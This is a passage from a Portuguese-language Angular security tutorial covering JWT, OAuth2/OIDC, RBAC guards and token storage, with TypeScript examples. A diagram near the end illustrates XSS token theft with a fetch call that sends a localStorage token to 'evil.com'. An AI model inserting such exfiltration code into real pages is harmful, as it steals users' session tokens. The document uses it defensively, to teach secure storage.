1. **Use CSP em produção sempre** - é uma das proteções mais eficazes contra XSS
2. **Evite 'unsafe-inline' e 'unsafe-eval'** - reduzem segurança significativamente
3. **Use nonces ou hashes** - para permitir scripts/styles inline necessários de forma segura
4. **Configure report-uri** - monitore violações para ajustar política
5. **Teste CSP em desenvolvimento** - identifique problemas antes de produção
6. **CSP funciona em conjunto com sanitização** - não substitui, complementa
7. **Angular funciona com CSP strict** - mas requer configuração adequada de nonces

---

### Autenticação JWT

**Definição**: JWT (JSON Web Token) é um padrão aberto (RFC 7519) para autenticação baseado em tokens que permite transmitir informações de forma segura entre partes como um objeto JSON compacto e autocontido.

**Explicação Detalhada**:

JWT revolucionou autenticação web ao introduzir tokens stateless que contêm todas as informações necessárias para autenticação, eliminando a necessidade de armazenar sessões no servidor.

**Estrutura de um JWT**:

Um JWT consiste em três partes separadas por pontos (.):

```
┌─────────────────────────────────────────────────────────────┐
│                    JWT Structure                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  header.payload.signature                                   │
│                                                             │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                  │
│  │  Header  │  │  Payload │  │Signature │                  │
│  │          │  │          │  │          │                  │
│  │ {        │  │ {        │  │ HMAC(    │                  │
│  │   "alg": │  │   "sub": │  │   base64 │                  │
│  │   "typ": │  │   "name":│  │   (header│                  │
│  │ }        │  │   "exp": │  │   + "." +│                  │
│  │          │  │ }        │  │   payload│                  │
│  │          │  │          │  │   ),      │                  │
│  │          │  │          │  │   secret │                  │
│  │          │  │          │  │ )        │                  │
│  └──────────┘  └──────────┘  └──────────┘                  │
│                                                             │
│  Base64URL    Base64URL    Base64URL                       │
│  Encoded      Encoded      Encoded                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**1. Header**:
- Tipo do token (JWT)
- Algoritmo de assinatura (HS256, RS256, etc.)
- Exemplo: `{"alg": "HS256", "typ": "JWT"}`

**2. Payload**:
- Claims (dados sobre o usuário)
- Claims registrados: `iss` (issuer), `exp` (expiration), `sub` (subject)
- Claims públicos: dados customizados
- Claims privados: dados específicos da aplicação
- Exemplo: `{"sub": "1234567890", "name": "John Doe", "exp": 1516239022}`

**3. Signature**:
- Verifica que token não foi alterado
- Assinado usando secret (HS256) ou chave privada (RS256)
- Servidor valida assinatura para garantir autenticidade

**Fluxo de Autenticação JWT**:

```
┌─────────────────────────────────────────────────────────────┐
│              JWT Authentication Flow                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. User Login                                             │
│     ┌──────────────┐                                       │
│     │  POST /login │  { email, password }                  │
│     └──────┬───────┘                                       │
│            │                                                │
│            ▼                                                │
│  2. Server Validates                                       │
│     ┌──────────────────────┐                                │
│     │  Check credentials  │                                │
│     │  Generate JWT       │                                │
│     └──────┬──────────────┘                                │
│            │                                                │
│            ▼                                                │
│  3. Server Returns JWT                                    │
│     ┌──────────────────────┐                                │
│     │  {                  │                                │
│     │    "token": "eyJ..."│                                │
│     │    "refresh": "..."  │                                │
│     │  }                   │                                │
│     └──────┬──────────────┘                                │
│            │                                                │
│            ▼                                                │
│  4. Client Stores Token                                   │
│     ┌──────────────────────┐                                │
│     │  localStorage/        │                                │
│     │  sessionStorage/      │                                │
│     │  httpOnly cookie      │                                │
│     └──────┬──────────────┘                                │
│            │                                                │
│            ▼                                                │
│  5. Client Sends Token                                    │
│     ┌──────────────────────┐                                │
│     │  GET /api/data       │                                │
│     │  Header:             │                                │
│     │  Authorization:      │                                │
│     │  Bearer eyJ...       │                                │
│     └──────┬──────────────┘                                │
│            │                                                │
│            ▼                                                │
│  6. Server Validates                                      │
│     ┌──────────────────────┐                                │
│     │  Verify signature    │                                │
│     │  Check expiration    │                                │
│     │  Extract claims      │                                │
│     └──────────────────────┘                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Vantagens do JWT**:

- **Stateless**: Servidor não precisa armazenar sessões
- **Escalável**: Funciona bem com múltiplos servidores
- **Portável**: Token pode ser usado em diferentes domínios
- **Self-contained**: Token contém todas informações necessárias
- **Padrão**: RFC 7519, amplamente suportado

**Desvantagens do JWT**:

- **Não pode ser revogado facilmente**: Token válido até expirar
- **Tamanho**: Maior que session IDs (pode ser problema em cookies)
- **Segurança**: Se comprometido, válido até expiração
- **Refresh tokens**: Necessários para boa experiência do usuário

**Refresh Tokens**:

Refresh tokens são tokens de longa duração usados para obter novos access tokens sem requerer login novamente:

- **Access Token**: Curta duração (15 minutos - 1 hora)
- **Refresh Token**: Longa duração (7-30 dias)
- Refresh token é usado apenas para obter novo access token
- Refresh tokens devem ser armazenados com mais segurança

**Analogia Detalhada**:

JWT é como um passe de acesso temporário para um evento:

**Sem JWT (Sessões)** é como ter uma lista na portaria - quando você chega, a segurança verifica seu nome na lista. Se você vai para outro evento, precisa que seu nome seja adicionado em outra lista. Se há múltiplas portarias, cada uma precisa de uma cópia da lista.

**Com JWT** é como ter um passe com QR code que contém todas suas informações:
- O passe tem sua foto, nome, tipo de acesso, e data de validade
- A portaria escaneia o QR code e verifica a assinatura digital
- Se a assinatura é válida e não expirou, você entra
- O mesmo passe funciona em qualquer portaria do evento
- Não precisa verificar lista - o passe é a prova

**Access Token** é como um passe diário - funciona hoje, mas amanhã precisa renovar.
**Refresh Token** é como ter um cartão de membro - você mostra na portaria e recebe um novo passe diário sem precisar se registrar novamente.

**Exemplo Prático Completo**:

```typescript
import { Injectable, inject } from '@angular/core';
import { HttpClient, HttpErrorResponse } from '@angular/common/http';
import { Observable, BehaviorSubject, throwError } from 'rxjs';
import { tap, catchError, map } from 'rxjs/operators';

interface LoginResponse {
  accessToken: string;
  refreshToken: string;
  expiresIn: number;
}

interface TokenPayload {
  sub: string;
  email: string;
  role: string;
  exp: number;
  iat: number;
}

@Injectable({
  providedIn: 'root'
})
export class AuthService {
  private http = inject(HttpClient);
  private readonly ACCESS_TOKEN_KEY = 'access_token';
  private readonly REFRESH_TOKEN_KEY = 'refresh_token';
  
  private currentUserSubject = new BehaviorSubject<TokenPayload | null>(null);
  public currentUser$ = this.currentUserSubject.asObservable();
  
  constructor() {
    this.loadUserFromToken();
  }
  
  login(credentials: { email: string; password: string }): Observable<LoginResponse> {
    return this.http.post<LoginResponse>('/api/auth/login', credentials).pipe(
      tap(response => {
        this.setTokens(response.accessToken, response.refreshToken);
        this.loadUserFromToken();
      }),
      catchError(this.handleError)
    );
  }
  
  logout(): void {
    localStorage.removeItem(this.ACCESS_TOKEN_KEY);
    localStorage.removeItem(this.REFRESH_TOKEN_KEY);
    this.currentUserSubject.next(null);
  }
  
  getAccessToken(): string | null {
    return localStorage.getItem(this.ACCESS_TOKEN_KEY);
  }
  
  getRefreshToken(): string | null {
    return localStorage.getItem(this.REFRESH_TOKEN_KEY);
  }
  
  isAuthenticated(): boolean {
    const token = this.getAccessToken();
    if (!token) return false;
    
    const payload = this.decodeToken(token);
    if (!payload) return false;
    
    return payload.exp * 1000 > Date.now();
  }
  
  refreshAccessToken(): Observable<string> {
    const refreshToken = this.getRefreshToken();
    if (!refreshToken) {
      return throwError(() => new Error('No refresh token'));
    }
    
    return this.http.post<{ accessToken: string }>('/api/auth/refresh', {
      refreshToken
    }).pipe(
      tap(response => {
        this.setAccessToken(response.accessToken);
        this.loadUserFromToken();
      }),
      map(response => response.accessToken),
      catchError(error => {
        this.logout();
        return throwError(() => error);
      })
    );
  }
  
  private setTokens(accessToken: string, refreshToken: string): void {
    localStorage.setItem(this.ACCESS_TOKEN_KEY, accessToken);
    localStorage.setItem(this.REFRESH_TOKEN_KEY, refreshToken);
  }
  
  private setAccessToken(accessToken: string): void {
    localStorage.setItem(this.ACCESS_TOKEN_KEY, accessToken);
  }
  
  private decodeToken(token: string): TokenPayload | null {
    try {
      const base64Url = token.split('.')[1];
      const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
      const jsonPayload = decodeURIComponent(
        atob(base64)
          .split('')
          .map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
          .join('')
      );
      return JSON.parse(jsonPayload);
    } catch (error) {
      return null;
    }
  }
  
  private loadUserFromToken(): void {
    const token = this.getAccessToken();
    if (token) {
      const payload = this.decodeToken(token);
      if (payload && payload.exp * 1000 > Date.now()) {
        this.currentUserSubject.next(payload);
      } else {
        this.logout();
      }
    }
  }
  
  private handleError(error: HttpErrorResponse): Observable<never> {
    let errorMessage = 'An error occurred';
    if (error.error instanceof ErrorEvent) {
      errorMessage = `Error: ${error.error.message}`;
    } else {
      errorMessage = `Error Code: ${error.status}\nMessage: ${error.message}`;
    }
    return throwError(() => new Error(errorMessage));
  }
}
```

**Tabela Comparativa: Autenticação entre Padrões**:

| Característica | JWT | Session Cookies | OAuth2 | API Keys |
|---------------|-----|----------------|--------|----------|
| **Stateless** | ✅ Sim | ❌ Não | ✅ Sim | ✅ Sim |
| **Escalável** | ✅ Sim | ⚠️ Requer shared storage | ✅ Sim | ✅ Sim |
| **Revogável** | ❌ Difícil | ✅ Fácil | ✅ Sim | ✅ Sim |
| **Tamanho** | ⚠️ Médio | ✅ Pequeno | ⚠️ Médio | ✅ Pequeno |
| **Segurança** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐ |
| **Uso Ideal** | APIs, SPAs | Web apps tradicionais | Apps sociais | Serviços internos |

**Pontos Críticos**:

1. **Nunca armazene JWT em localStorage se site é vulnerável a XSS** - prefira httpOnly cookies
2. **Sempre valide expiração** - tokens expirados devem ser rejeitados
3. **Use HTTPS sempre** - tokens em trânsito devem ser criptografados
4. **Implemente refresh tokens** - para melhor experiência do usuário e segurança
5. **Não coloque dados sensíveis no payload** - payload é base64, não criptografado
6. **Use algoritmos fortes** - RS256 é mais seguro que HS256 para APIs públicas
7. **Implemente revogação** - use blacklist ou tokens de curta duração

---

### OAuth2 e OpenID Connect

**Definição**: OAuth2 é um protocolo de autorização que permite aplicações obter acesso limitado a recursos de usuários em serviços HTTP, enquanto OpenID Connect (OIDC) é uma camada de autenticação construída sobre OAuth2 que adiciona identidade do usuário.

**Explicação Detalhada**:

OAuth2 e OpenID Connect são padrões da indústria para autenticação e autorização que eliminam a necessidade de gerenciar senhas próprias, delegando autenticação para provedores confiáveis como Google, Microsoft, GitHub, etc.

**Diferença entre OAuth2 e OpenID Connect**:

**OAuth2**:
- Foco em **autorização** (permissões)
- Responde: "Esta aplicação pode acessar meus dados?"
- Retorna: Access Token (acesso a recursos)
- Não fornece identidade do usuário

**OpenID Connect**:
- Foco em **autenticação** (identidade)
- Responde: "Quem é este usuário?"
- Retorna: ID Token (identidade) + Access Token
- Construído sobre OAuth2
- Adiciona camada de identidade

**Fluxo OAuth2 Authorization Code (Recomendado)**:

```
┌─────────────────────────────────────────────────────────────┐
│          OAuth2 Authorization Code Flow                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. User clicks "Login with Google"                        │
│     ┌──────────────┐                                       │
│     │  App         │  Redirects to Google                  │
│     └──────┬───────┘                                       │
│            │                                                │
│            ▼                                                │
│  2. User authenticates with Google                         │
│     ┌──────────────┐                                       │
│     │  Google      │  User enters credentials             │
│     │  Login Page  │                                       │
│     └──────┬───────┘                                       │
│            │                                                │
│            ▼                                                │
│  3. Google redirects with authorization code              │
│     ┌──────────────┐                                       │
│     │  Callback    │  ?code=abc123&state=xyz              │
│     │  /callback   │                                       │
│     └──────┬───────┘                                       │
│            │                                                │
│            ▼                                                │
│  4. App exchanges code for tokens                         │
│     ┌──────────────────────┐                                │
│     │  POST /token         │                                │
│     │  code + client_secret│                                │
│     └──────┬───────────────┘                                │
│            │                                                │
│            ▼                                                │
│  5. Provider returns tokens                               │
│     ┌──────────────────────┐                                │
│     │  {                  │                                │
│     │    access_token     │                                │
│     │    refresh_token    │                                │
│     │    id_token (OIDC)  │                                │
│     │  }                  │                                │
│     └──────────────────────┘                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Componentes OAuth2**:

**Resource Owner**: O usuário (dono dos dados)
**Client**: Sua aplicação Angular
**Authorization Server**: Google, GitHub, etc. (emite tokens)
**Resource Server**: API que possui recursos protegidos

**Scopes (Escopos)**:

Scopes definem quais permissões a aplicação está solicitando:
- `openid`: Identidade do usuário (OIDC)
- `profile`: Informações básicas do perfil
- `email`: Endereço de email
- `read`: Acesso de leitura
- `write`: Acesso de escrita

**Tokens Retornados**:

**Access Token**: Usado para acessar APIs do provedor
**Refresh Token**: Usado para obter novos access tokens
**ID Token** (OIDC): Contém informações de identidade do usuário (JWT)

**Analogia Detalhada**:

OAuth2 é como dar uma chave temporária para alguém acessar seu cofre:

**Sem OAuth2** é como dar sua senha do banco para cada aplicativo que você usa. Se um aplicativo é comprometido, sua senha está comprometida. Você precisa confiar em cada aplicativo com suas credenciais completas.

**Com OAuth2** é como ter um sistema de chaves temporárias:
- Você vai ao banco (Authorization Server) e diz "quero dar acesso limitado ao meu cofre para este aplicativo"
- O banco verifica sua identidade (você faz login)
- O banco emite uma chave temporária com permissões específicas (Access Token)
- O aplicativo usa a chave para acessar apenas o que você permitiu
- Se a chave é comprometida, você pode revogá-la sem mudar sua senha principal

**OpenID Connect** adiciona identidade: além da chave temporária, você também recebe um documento que prova quem você é (ID Token), como uma carteira de identidade digital.

**Exemplo Prático Completo**:

```typescript
import { Injectable } from '@angular/core';
import { OAuthService, AuthConfig } from 'angular-oauth2-oidc';
import { BehaviorSubject, Observable } from 'rxjs';

interface UserInfo {
  sub: string;
  email: string;
  name: string;
  picture: string;
}

@Injectable({
  providedIn: 'root'
})
export class OAuthAuthService {
  private userSubject = new BehaviorSubject<UserInfo | null>(null);
  public user$ = this.userSubject.asObservable();
  
  constructor(private oauthService: OAuthService) {
    this.configureOAuth();
  }
  
  private configureOAuth(): void {
    const authConfig: AuthConfig = {
      issuer: 'https://accounts.google.com',
      redirectUri: window.location.origin + '/callback',
      clientId: 'YOUR_GOOGLE_CLIENT_ID',
      scope: 'openid profile email',
      responseType: 'code',
      showDebugInformation: true,
      strictDiscoveryDocumentValidation: false
    };
    
    this.oauthService.configure(authConfig);
    this.oauthService.loadDiscoveryDocumentAndTryLogin().then(() => {
      if (this.oauthService.hasValidAccessToken()) {
        this.loadUserProfile();
      }
    });
  }
  
  login(): void {
    this.oauthService.initCodeFlow();
  }
  
  logout(): void {
    this.oauthService.logOut();
    this.userSubject.next(null);
  }
  
  isAuthenticated(): boolean {
    return this.oauthService.hasValidAccessToken();
  }
  
  getAccessToken(): string {
    return this.oauthService.getAccessToken();
  }
  
  private loadUserProfile(): void {
    this.oauthService.loadUserProfile().then((profile: any) => {
      this.userSubject.next({
        sub: profile.sub,
        email: profile.email,
        name: profile.name,
        picture: profile.picture
      });
    });
  }
  
  refreshToken(): Observable<void> {
    return new Observable(observer => {
      this.oauthService.refreshToken().then(() => {
        observer.next();
        observer.complete();
      }).catch(error => {
        observer.error(error);
      });
    });
  }
}
```

**Configuração no app.config.ts**:

```typescript
import { ApplicationConfig } from '@angular/core';
import { provideHttpClient } from '@angular/common/http';
import { provideOAuthClient } from 'angular-oauth2-oidc';

export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(),
    provideOAuthClient()
  ]
};
```

**Tabela Comparativa: Autenticação Social**:

| Provedor | OAuth2 | OpenID Connect | Popularidade | Facilidade de Integração |
|----------|--------|----------------|--------------|-------------------------|
| **Google** | ✅ Sim | ✅ Sim | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **Microsoft** | ✅ Sim | ✅ Sim | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **GitHub** | ✅ Sim | ⚠️ Parcial | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **Facebook** | ✅ Sim | ❌ Não | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| **Apple** | ✅ Sim | ✅ Sim | ⭐⭐⭐ | ⭐⭐⭐ |
| **Auth0** | ✅ Sim | ✅ Sim | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

**Vantagens de OAuth2/OIDC**:

- **Sem gerenciamento de senhas**: Provedor gerencia segurança
- **Single Sign-On (SSO)**: Login uma vez, acesso a múltiplos serviços
- **Escopo limitado**: Aplicação só acessa o que usuário permite
- **Revogável**: Usuário pode revogar acesso a qualquer momento
- **Padrão da indústria**: Amplamente suportado e testado

**Desvantagens**:

- **Dependência externa**: Requer provedor funcionando
- **Complexidade**: Mais complexo que autenticação simples
- **Privacidade**: Provedor sabe quais apps usuário usa
- **Configuração**: Requer registro em cada provedor

**Pontos Críticos**:

1. **Use Authorization Code Flow** - mais seguro que Implicit Flow
2. **Valide state parameter** - previne CSRF attacks
3. **Use PKCE** - Proof Key for Code Exchange para clients públicos
4. **Armazene tokens com segurança** - httpOnly cookies ou secure storage
5. **Implemente refresh tokens** - para melhor experiência do usuário
6. **Valide ID Token** - verifique assinatura e claims em OIDC
7. **Configure redirect URIs corretamente** - apenas URLs permitidas
8. **Use HTTPS sempre** - tokens em trânsito devem ser criptografados

---

### Role-Based Access Control (RBAC)

**Definição**: RBAC (Role-Based Access Control) é um modelo de controle de acesso que restringe acesso a recursos baseado em roles (papéis) atribuídos a usuários, onde cada role possui um conjunto específico de permissões.

**Explicação Detalhada**:

RBAC é um padrão fundamental de segurança que separa autenticação (quem você é) de autorização (o que você pode fazer). Em vez de verificar permissões individuais para cada usuário, RBAC agrupa usuários em roles e atribui permissões a roles.

**Hierarquia RBAC**:

```
┌─────────────────────────────────────────────────────────────┐
│                    RBAC Hierarchy                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Users                                                      │
│    │                                                        │
│    ├─── User 1 ──────┐                                     │
│    ├─── User 2 ──────┤                                     │
│    └─── User 3 ──────┘                                     │
│           │                                                │
│           ▼                                                │
│  Roles                                                     │
│    │                                                        │
│    ├─── Admin ────────┐                                   │
│    ├─── Editor ───────┤                                   │
│    ├─── Viewer ───────┤                                   │
│    └─── Guest ────────┘                                   │
│           │                                                │
│           ▼                                                │
│  Permissions                                              │
│    │                                                        │
│    ├─── create:post                                       │
│    ├─── edit:post                                         │
│    ├─── delete:post                                       │
│    ├─── view:post                                         │
│    └─── manage:users                                       │
│                                                             │
│  Role-Permission Mapping:                                  │
│    Admin:     [create, edit, delete, view, manage]        │
│    Editor:    [create, edit, view]                        │
│    Viewer:    [view]                                       │
│    Guest:     []                                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Componentes RBAC**:

**1. Users (Usuários)**:
- Entidades que precisam acessar recursos
- Podem ter múltiplos roles
- Identificados por ID único

**2. Roles (Papéis)**:
- Agrupamentos funcionais de usuários
- Exemplos: Admin, Editor, Viewer, Guest
- Roles podem herdar de outros roles

**3. Permissions (Permissões)**:
- Ações específicas que podem ser executadas
- Formato: `action:resource` (ex: `create:post`, `delete:user`)
- Permissões são atribuídas a roles, não a usuários diretamente

**4. Resources (Recursos)**:
- Entidades que precisam ser protegidas
- Exemplos: Posts, Users, Settings
- Cada recurso pode ter múltiplas ações

**Fluxo de Autorização RBAC**:

```
┌─────────────────────────────────────────────────────────────┐
│          RBAC Authorization Flow                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. User requests resource                                 │
│     ┌──────────────┐                                       │
│     │  GET /posts  │  User wants to view posts            │
│     └──────┬───────┘                                       │
│            │                                                │
│            ▼                                                │
│  2. Extract user roles                                     │
│     ┌──────────────────────┐                               │
│     │  From JWT token       │                               │
│     │  roles: ["Editor"]    │                               │
│     └──────┬───────────────┘                               │
│            │                                                │
│            ▼                                                │
│  3. Check role permissions                                 │
│     ┌──────────────────────┐                               │
│     │  Editor permissions:  │                               │
│     │  - create:post        │                               │
│     │  - edit:post         │                               │
│     │  - view:post         │                               │
│     └──────┬───────────────┘                               │
│            │                                                │
│            ▼                                                │
│  4. Verify permission                                      │
│     ┌──────────────────────┐                               │
│     │  Request: view:post   │                               │
│     │  Has permission?     │  ✅ Yes                       │
│     └──────┬───────────────┘                               │
│            │                                                │
│            ▼                                                │
│  5. Allow access                                          │
│     ┌──────────────────────┐                               │
│     │  Return posts data    │                               │
│     └──────────────────────┘                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Implementação em Angular**:

RBAC em Angular é implementado através de:
- **Guards**: Protegem rotas baseado em roles
- **Directives**: Mostram/escondem UI baseado em roles
- **Services**: Verificam permissões programaticamente
- **Interceptors**: Adicionam headers de autorização

**Analogia Detalhada**:

RBAC é como um sistema de acesso em um prédio de escritórios:

**Sem RBAC** é como ter um segurança que precisa verificar manualmente cada pessoa e decidir o que ela pode fazer. Se há 1000 funcionários e 50 áreas diferentes, o segurança precisa memorizar 50.000 combinações de permissões.

**Com RBAC** é como ter um sistema de crachás por departamento:
- **Users** são os funcionários
- **Roles** são os departamentos (TI, RH, Financeiro, etc.)
- **Permissions** são as áreas que cada departamento pode acessar
- **Guest** não tem crachá - não entra em lugar nenhum

Quando alguém tenta entrar em uma área, o sistema verifica o crachá (role) e vê se aquele departamento tem permissão para aquela área. Muito mais simples e escalável.

**Exemplo Prático Completo**:

```typescript
import { Injectable, inject } from '@angular/core';
import { CanActivate, ActivatedRouteSnapshot, RouterStateSnapshot, Router } from '@angular/router';
import { Observable } from 'rxjs';

interface User {
  id: string;
  email: string;
  roles: string[];
}

@Injectable({
  providedIn: 'root'
})
export class AuthService {
  private currentUser: User | null = null;
  
  setUser(user: User): void {
    this.currentUser = user;
  }
  
  getUser(): User | null {
    return this.currentUser;
  }
  
  hasRole(role: string): boolean {
    return this.currentUser?.roles.includes(role) ?? false;
  }
  
  hasAnyRole(roles: string[]): boolean {
    return roles.some(role => this.hasRole(role));
  }
  
  hasAllRoles(roles: string[]): boolean {
    return roles.every(role => this.hasRole(role));
  }
  
  hasPermission(permission: string): boolean {
    const rolePermissions = this.getRolePermissions();
    return rolePermissions.includes(permission);
  }
  
  private getRolePermissions(): string[] {
    if (!this.currentUser) return [];
    
    const permissions: { [role: string]: string[] } = {
      admin: ['create:post', 'edit:post', 'delete:post', 'view:post', 'manage:users'],
      editor: ['create:post', 'edit:post', 'view:post'],
      viewer: ['view:post'],
      guest: []
    };
    
    return this.currentUser.roles.flatMap(role => permissions[role] || []);
  }
}

@Injectable({
  providedIn: 'root'
})
export class RoleGuard implements CanActivate {
  private authService = inject(AuthService);
  private router = inject(Router);
  
  canActivate(
    route: ActivatedRouteSnapshot,
    state: RouterStateSnapshot
  ): boolean {
    const requiredRoles = route.data['roles'] as string[];
    
    if (!requiredRoles || requiredRoles.length === 0) {
      return true;
    }
    
    if (this.authService.hasAnyRole(requiredRoles)) {
      return true;
    }
    
    this.router.navigate(['/unauthorized']);
    return false;
  }
}

@Injectable({
  providedIn: 'root'
})
export class PermissionGuard implements CanActivate {
  private authService = inject(AuthService);
  private router = inject(Router);
  
  canActivate(
    route: ActivatedRouteSnapshot,
    state: RouterStateSnapshot
  ): boolean {
    const requiredPermission = route.data['permission'] as string;
    
    if (!requiredPermission) {
      return true;
    }
    
    if (this.authService.hasPermission(requiredPermission)) {
      return true;
    }
    
    this.router.navigate(['/unauthorized']);
    return false;
  }
}
```

**Diretiva para UI**:

```typescript
import { Directive, Input, TemplateRef, ViewContainerRef, inject } from '@angular/core';
import { AuthService } from './auth.service';

@Directive({
  selector: '[appHasRole]',
  standalone: true
})
export class HasRoleDirective {
  private authService = inject(AuthService);
  private templateRef = inject(TemplateRef<any>);
  private viewContainer = inject(ViewContainerRef);
  
  @Input() set appHasRole(roles: string[]) {
    if (this.authService.hasAnyRole(roles)) {
      this.viewContainer.createEmbeddedView(this.templateRef);
    } else {
      this.viewContainer.clear();
    }
  }
}

@Directive({
  selector: '[appHasPermission]',
  standalone: true
})
export class HasPermissionDirective {
  private authService = inject(AuthService);
  private templateRef = inject(TemplateRef<any>);
  private viewContainer = inject(ViewContainerRef);
  
  @Input() set appHasPermission(permission: string) {
    if (this.authService.hasPermission(permission)) {
      this.viewContainer.createEmbeddedView(this.templateRef);
    } else {
      this.viewContainer.clear();
    }
  }
}
```

**Uso em Template**:

```html
<button *appHasRole="['admin', 'editor']" (click)="createPost()">
  Create Post
</button>

<button *appHasPermission="'delete:post'" (click)="deletePost()">
  Delete Post
</button>
```

**Configuração de Rotas**:

```typescript
export const routes: Routes = [
  {
    path: 'admin',
    component: AdminComponent,
    canActivate: [RoleGuard],
    data: { roles: ['admin'] }
  },
  {
    path: 'posts/create',
    component: CreatePostComponent,
    canActivate: [PermissionGuard],
    data: { permission: 'create:post' }
  }
];
```

**Tabela Comparativa: Modelos de Autorização**:

| Modelo | Complexidade | Escalabilidade | Flexibilidade | Uso Ideal |
|--------|-------------|----------------|---------------|-----------|
| **RBAC** | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Aplicações com roles claros |
| **ABAC** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Aplicações com regras complexas |
| **ACL** | ⭐⭐ | ⭐⭐ | ⭐⭐⭐ | Aplicações pequenas |
| **Permissions** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Aplicações com muitas permissões |

**Pontos Críticos**:

1. **Valide no backend também** - frontend pode ser contornado
2. **Use roles, não permissões diretas** - mais fácil de gerenciar
3. **Implemente herança de roles** - roles podem herdar de outros roles
4. **Cache roles e permissões** - evite decodificar JWT repetidamente
5. **Guards devem ser rápidos** - não façam requisições HTTP síncronas
6. **Diretivas são para UX** - não são segurança real
7. **Documente roles e permissões** - mantenha documentação atualizada

---

### Armazenamento Seguro de Tokens

**Definição**: Armazenamento seguro de tokens é o processo de guardar tokens de autenticação de forma que minimizem risco de roubo através de ataques XSS, CSRF ou acesso não autorizado, enquanto mantêm funcionalidade necessária para a aplicação.

**Explicação Detalhada**:

Onde e como você armazena tokens determina significativamente a segurança da sua aplicação. Cada método de armazenamento tem trade-offs entre segurança e funcionalidade.

**Opções de Armazenamento**:

**1. httpOnly Cookies**:
- **Segurança**: ⭐⭐⭐⭐⭐ (Máxima)
- **Acessibilidade JavaScript**: ❌ Não acessível via JavaScript
- **Proteção XSS**: ✅ Excelente (JavaScript não pode ler)
- **Proteção CSRF**: ⚠️ Requer tokens CSRF adicionais
- **Uso**: Ideal para aplicações web tradicionais

**2. sessionStorage**:
- **Segurança**: ⭐⭐⭐ (Média)
- **Acessibilidade JavaScript**: ✅ Totalmente acessível
- **Proteção XSS**: ❌ Vulnerável (JavaScript pode ler)
- **Proteção CSRF**: ✅ Boa (não enviado automaticamente)
- **Persistência**: Apenas durante sessão do navegador
- **Uso**: Aplicações SPA com proteção XSS adequada

**3. localStorage**:
- **Segurança**: ⭐⭐ (Baixa)
- **Acessibilidade JavaScript**: ✅ Totalmente acessível
- **Proteção XSS**: ❌ Vulnerável (JavaScript pode ler)
- **Proteção CSRF**: ✅ Boa (não enviado automaticamente)
- **Persistência**: Persiste entre sessões
- **Uso**: Evitar quando possível

**4. Memory (Variáveis)**:
- **Segurança**: ⭐⭐⭐⭐ (Alta para XSS)
- **Acessibilidade JavaScript**: ✅ Acessível apenas no contexto da aplicação
- **Proteção XSS**: ✅ Boa (não persistente)
- **Proteção CSRF**: ✅ Boa
- **Persistência**: ❌ Perdido ao recarregar página
- **Uso**: Tokens temporários, não recomendado para produção

**Comparação de Segurança**:

```
┌─────────────────────────────────────────────────────────────┐
│          Token Storage Security Comparison                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  httpOnly Cookie                                            │
│  ┌──────────────────────────────────────┐                   │
│  │  XSS Protection:     ████████████    │  ✅ Excellent     │
│  │  CSRF Protection:    ████░░░░░░░░    │  ⚠️  Needs tokens │
│  │  JavaScript Access:  ░░░░░░░░░░░░    │  ❌ No            │
│  │  Persistence:        ████████████    │  ✅ Yes           │
│  └──────────────────────────────────────┘                   │
│                                                             │
│  sessionStorage                                             │
│  ┌──────────────────────────────────────┐                   │
│  │  XSS Protection:     ████░░░░░░░░    │  ❌ Vulnerable    │
│  │  CSRF Protection:    ████████████    │  ✅ Excellent     │
│  │  JavaScript Access:  ████████████    │  ✅ Yes           │
│  │  Persistence:        ████░░░░░░░░    │  ⚠️  Session only │
│  └──────────────────────────────────────┘                   │
│                                                             │
│  localStorage                                               │
│  ┌──────────────────────────────────────┐                   │
│  │  XSS Protection:     ████░░░░░░░░    │  ❌ Vulnerable    │
│  │  CSRF Protection:    ████████████    │  ✅ Excellent     │
│  │  JavaScript Access:  ████████████    │  ✅ Yes           │
│  │  Persistence:        ████████████    │  ✅ Yes           │
│  └──────────────────────────────────────┘                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Fluxo de Ataque XSS em localStorage**:

```
┌─────────────────────────────────────────────────────────────┐
│          XSS Attack on localStorage                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Attacker injects script                                │
│     ┌──────────────┐                                       │
│     │  <script>    │  Injected via XSS vulnerability      │
│     │  stealToken()│                                       │
│     └──────┬───────┘                                       │
│            │                                                │
│            ▼                                                │
│  2. Script executes                                        │
│     ┌──────────────────────┐                               │
│     │  const token =       │                               │
│     │    localStorage      │                               │
│     │    .getItem('token')│                               │
│     └──────┬───────────────┘                               │
│            │                                                │
│            ▼                                                │
│  3. Token sent to attacker                                │
│     ┌──────────────────────┐                               │
│     │  fetch('evil.com', { │                               │
│     │    body: token       │                               │
│     │  })                  │                               │
│     └──────────────────────┘                               │
│                                                             │
│  4. Attacker uses token                                   │
│     ┌──────────────────────┐                               │
│     │  Access user account │                               │
│     │  Steal data          │                               │
│     └──────────────────────┘                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Estratégias de Armazenamento Seguro**:

